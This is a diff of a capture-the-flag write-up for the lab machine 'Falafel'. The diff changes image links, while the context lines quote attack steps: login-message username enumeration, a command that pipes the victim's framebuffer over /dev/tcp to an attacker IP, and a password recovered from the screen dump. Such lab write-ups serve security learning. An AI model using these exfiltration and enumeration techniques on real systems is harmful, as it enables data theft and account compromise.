@@ -36,7 +36,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 The web page forwards to _index.php_ and is a custom social network about falafels.
 On the top right is a login button that forwards to _login.php_:
 
-![Falafel login page](https://kyuu-ji.github.io/htb-write-up/falafel/falafel_web-1.png)
+![Falafel login page](falafel_web-1.png)
 
 When trying out usernames it displays the message _"Try again"_, but when using _admin_ as the username it displays _"Wrong identification : admin"_.
 
@@ -143,7 +143,7 @@ The profile of _admin_ has a quote in it, that could be another hint:
 
 The user _admin_ has an upload feature available:
 
-![Admin upload feature](https://kyuu-ji.github.io/htb-write-up/falafel/falafel_web-2.png)
+![Admin upload feature](falafel_web-2.png)
 
 Starting a listener on port 80 and using my local client to upload an image and it sends a response back:
 ```markdown
@@ -266,7 +266,7 @@ cat /dev/fb0 > /dev/tcp/10.10.14.2/9002
 When opening it with any image manipulation program like **GIMP**, it opens it but nothing can be read because the resolution is not correct.
 The correct resolution can be found in _/sys/class/graphics/fb0/virtual_size_ and it is 1176x885.
 
-![Falafel login page](https://kyuu-ji.github.io/htb-write-up/falafel/falafel_image-1.png)
+![Falafel login page](falafel_image-1.png)
 
 On the screen it shows that _yossi_ did a mistake and typed a password change into the terminal:
 > MoshePlzStopHackingMe!
